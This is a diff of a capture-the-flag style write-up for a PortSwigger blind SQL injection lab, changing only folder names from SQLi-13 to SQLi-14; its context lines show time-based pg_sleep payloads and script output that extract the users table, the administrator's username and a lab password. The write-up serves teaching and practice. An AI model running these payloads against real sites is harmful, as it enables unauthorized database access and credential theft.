@@ -20,7 +20,7 @@ To solve the lab, log in as the `administrator` user.
 
 **Home page:**
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-13/images/Pasted%20image%2020221208033626.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-14/images/Pasted%20image%2020221208033626.png)
 
 **In the previous labs, we found a blind SQL injection vulnerability in a tracking cookie, and it doesn't respond any different.**
 
@@ -65,7 +65,7 @@ payload = """'; SELECT pg_sleep(5)--"""
 ```
 
 ```
-┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/SQL-Injection/SQLi-13]
+┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/SQL-Injection/SQLi-14]
 └─# python3 exploit.py
 [+] The request time difference is: 5.94s
 ```
@@ -84,12 +84,12 @@ payload = """';SELECT CASE WHEN (1=2) THEN pg_sleep(5) ELSE pg_sleep(0) END--"""
 
 ```
 # Payload 1:
-┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/SQL-Injection/SQLi-13]
+┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/SQL-Injection/SQLi-14]
 └─# python3 exploit.py
 [+] The request time difference is: 5.96s
 
 # Payload 2:
-┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/SQL-Injection/SQLi-13]
+┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/SQL-Injection/SQLi-14]
 └─# python3 exploit.py
 [+] The request time difference is: 0.92s
 ```
@@ -158,7 +158,7 @@ if __name__ == '__main__':
 ```
 
 ```
-┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/SQL-Injection/SQLi-13]
+┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/SQL-Injection/SQLi-14]
 └─# python3 exploit.py
 [+] Found table:        users
 ```
@@ -227,7 +227,7 @@ if __name__ == '__main__':
 ```
 
 ```
-┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/SQL-Injection/SQLi-13]
+┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/SQL-Injection/SQLi-14]
 └─# python3 exploit.py
 [+] Found column:       username       
 [+] Found column:       password
@@ -281,12 +281,12 @@ payload = f"""';SELECT CASE WHEN (LENGTH(username) > 13) THEN pg_sleep(3) ELSE p
 
 ```
 # Payload 1:
-┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/SQL-Injection/SQLi-13]
+┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/SQL-Injection/SQLi-14]
 └─# python3 exploit.py
 [+] The request time difference is: 3.90s
 
 # Payload 2:
-┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/SQL-Injection/SQLi-13]
+┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/SQL-Injection/SQLi-14]
 └─# python3 exploit.py
 [+] The request time difference is: 0.91s
 ```
@@ -305,12 +305,12 @@ payload = f"""';SELECT CASE WHEN (LENGTH(password) > 20) THEN pg_sleep(3) ELSE p
 
 ```
 # Payload 1:
-┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/SQL-Injection/SQLi-13]
+┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/SQL-Injection/SQLi-14]
 └─# python3 exploit.py
 [+] The request time difference is: 3.93s
 
 # Payload 2:
-┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/SQL-Injection/SQLi-13]
+┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/SQL-Injection/SQLi-14]
 └─# python3 exploit.py
 [+] The request time difference is: 0.92s
 ```
@@ -374,7 +374,7 @@ if __name__ == '__main__':
 ```
 
 ```
-┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/SQL-Injection/SQLi-13]
+┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/SQL-Injection/SQLi-14]
 └─# python3 exploit.py
 [+] Found username characters: administrator
 [+] Found username: administrator
@@ -437,7 +437,7 @@ if __name__ == '__main__':
 ```
 
 ```
-┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/SQL-Injection/SQLi-13]
+┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/SQL-Injection/SQLi-14]
 └─# python3 exploit.py
 [+] Found password characters: 0jzprs1pqo19ewylpckp
 [+] Found password: 0jzprs1pqo19ewylpckp
@@ -447,9 +447,9 @@ if __name__ == '__main__':
 
 **Finally, armed with above information, we can login as `administrator`!!**
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-13/images/Pasted%20image%2020221208062409.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-14/images/Pasted%20image%2020221208062409.png)
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-13/images/Pasted%20image%2020221208062422.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-14/images/Pasted%20image%2020221208062422.png)
 
 **We're `administrator`!**
 
